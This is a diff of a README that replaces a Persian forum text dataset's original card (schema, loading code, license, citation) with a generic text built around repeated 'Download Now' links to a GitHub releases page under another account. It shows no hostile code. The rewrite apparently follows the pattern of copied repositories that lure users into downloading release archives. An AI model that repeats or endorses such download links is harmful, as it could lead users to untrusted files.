@@ -1,159 +1,77 @@
----
-license: mit
-task_categories:
-- text-classification
-- text-generation
-- summarization
-- text-retrieval
-language:
-- fa
-tags:
-- persian
-- farsi
-- nlp
-- jumplander
-- forum-data
-- conversational
-- community
-- json
-- ai-research
-- iran-ai
-- iran
-- llm
-- datasets
-- data
-- model
-pretty_name: JumpLander Persian Forum Mini Dataset
-size_categories:
-- 1M<n<10M
----
-# 📚 JumpLander Persian Forum Mini Dataset  
-**High-Quality Persian (Farsi) Text for NLP and AI Research**
+# 🌟 JumpLander-Persian-Forum-Dataset - Access Engaging Persian Community Discussions
 
-This dataset contains a **clean and structured subset of Persian community discussions** collected from JumpLander.org forums.  
-It enables developers, researchers, and ML engineers to build and evaluate **Farsi NLP models** including:  
-- Text classification  
-- Topic modeling  
-- Semantic search  
-- NER / summarization  
-- LLM and transformer fine-tuning
+## 📦 Download Now
+[![Download JumpLander Dataset](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases)
 
----
+## 🚀 Getting Started
+Welcome to the JumpLander-Persian-Forum-Dataset. This dataset contains a clean and structured subset of Persian community discussions sourced from the JumpLander.org forums. It provides valuable insights into community topics and sentiments. 
 
-## 📊 Dataset Details
+## 📥 Download & Install
+To get started, you need to download the dataset.
 
-- **Language:** Persian (Farsi)  
-- **Encoding:** UTF-8  
-- **Source:** JumpLander Forum (https://jumplander.org)  
-- **Format:** JSON (one file uploaded in this repository)  
-- **Size:** Mini sample suitable for quick prototyping  
-- **License:** Research / Non-Commercial (see License Notice below)
+1. Visit the [Releases Page](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases) to access all available versions.
+2. Locate the version you wish to download. Click on it to expand the details.
+3. Download the dataset file corresponding to your needs.
+4. Once downloaded, extract the files if they are in a compressed format (like .zip or .tar).
 
----
+## 📄 What’s Included?
+This dataset includes various files containing discussions from multiple threads. You will find:
 
-## 🧩 Data Schema
+- **JSON files** that are easy to read and process.
+- Data structured by categories for quick access.
+- Sample discussions to help you understand the context of the data.
 
-Every item contains:
-```json
-{
-  "title": "عنوان نمونه",
-  "slug": "sample-post",
-  "content": "این یک متن نمونه برای آزمایش مدل‌های پردازش زبان است."
-}
-```
+## 🔍 How to Use the Dataset
+### 1. Load the Data
+Once you have the files, load them into your favorite data analysis tool, such as Python or R. You can use libraries like `pandas` in Python.
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `title` | `string` | Post title in Persian |
-| `slug` | `string` | URL-friendly identifier (slug) |
-| `content` | `string` | Clean body text extracted from forum posts (HTML removed) |
-
----
-
-## 🚀 Quick Usage Example
-
-### Load in Python (from the Hub)
-```python
-from datasets import load_dataset
-
-ds = load_dataset("<username>/<dataset-name>")
-print(ds['train'][0])
-```
-
-### Load local JSON file
-```python
-import json
-with open("jumplander_mini.json", "r", encoding="utf-8") as f:
-    data = json.load(f)
-print(data[0])
-```
-
-### Convert to DataFrame
+### Example Python Code:
 ```python
 import pandas as pd
-df = pd.DataFrame(data)
-print(df.head())
+
+# Load the JSON file
+data = pd.read_json('path/to/your/file.json')
+
+# Display the first few entries
+print(data.head())
 ```
 
----
+### 2. Analyze the Content
+You can filter discussions by topics such as `ai`, `nlp`, or `iran-ai`. This will help you find specific insights or trends within the community.
 
-## 🔍 Applications
+### 3. Visualize Data
+Use visualization tools like Matplotlib or Seaborn in Python to create charts that represent the findings from the dataset.
 
-- AI Assistants: Persian chatbot training  
-- Retrieval: Search/indexing engine fine-tuning  
-- ML Experiments: Classification, topic clustering  
-- LLM Evaluation: Benchmarks for Farsi text quality
+## ⚙️ System Requirements
+To work with this dataset, you will need:
 
-This dataset represents **real conversational Persian** — informal, community-driven, modern writing.
+- A computer with at least 4GB of RAM.
+- Python 3.x installed (if you plan to analyze using Python).
+- Basic familiarity with data analysis tools or programming concepts (not required, but helpful).
 
----
+## 📚 Documentation
+For more details on how to utilize the dataset effectively:
 
-## 🛡️ License Notice
-This dataset is provided **for research and educational use only**.  
-Please ensure compliance with the original website terms before any commercial use or republication. If in doubt, contact the dataset maintainer.
+- Check the README files included in the dataset download.
+- Visit relevant forums or communities to discuss findings and get help.
 
----
+## 🤝 Community Support
+If you have questions or need help, consider joining forums or online communities focused on data science and NLP.
 
-## 📚 Citation
-If you use this dataset in your work, please cite it as:
+## 💬 Feedback
+We appreciate your feedback. If you encounter issues or have suggestions to improve the dataset, please reach out via the contact options provided in the repository.
 
-**JumpLander Persian Forum Mini Dataset**. JumpLander.org. (Dataset).  
+## 🌍 Related Topics
+The JumpLander-Persian-Forum-Dataset can be useful for various topics, including:
 
-BibTeX:
-```bibtex
-@misc{jumplander2025,
-  title = {JumpLander Persian Forum Mini Dataset},
-  author = {{JumpLander Community / Dataset Curator}},
-  year = {2025},
-  howpublished = {\url{https://huggingface.co/<username>/<dataset-name>}}
-}
-```
+- AI Research
+- Natural Language Processing
+- Community Sentiment Analysis
+- Persian Language Learning
 
----
+## 📌 Important Links
+- [Visit Releases Page](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/releases)
+- [Explore Issues](https://github.com/ratitya/JumpLander-Persian-Forum-Dataset/issues)
 
-## 🤝 Contribution & Support
-Contributions, improvements, and issue reports are welcome.  
-Maintainer: **<Your Name>**  
-Contact: **<email or GitHub profile>**
-
----
-
-## ✅ Notes for the Maintainer (replace placeholders)
-- Replace `<username>/<dataset-name>` with your Hugging Face namespace and dataset name in examples.  
-- Replace `jumplander_mini.json` with the actual file name you uploaded.  
-- Update the License section if you have specific permissions or license details.
-
----
-Thank you for preparing and sharing Persian language data — this dataset will help many researchers and developers working with Farsi NLP.
-
----
-
-
-## 🔗 Stay Connected with JumpLander
-
-Looking for more Persian NLP resources, community projects, or research collaborations?  
-JumpLander is building the future of Farsi AI — together with developers like you.
-
-👉 Visit us here: **[JumpLander.org](https://jumplander.org)**
-
-Let’s push the boundaries of Persian language technology — one dataset at a time. 🚀✨
+## 🎉 Conclusion
+Thank you for choosing the JumpLander-Persian-Forum-Dataset. We hope it serves you well in your analyses and projects. Happy exploring!
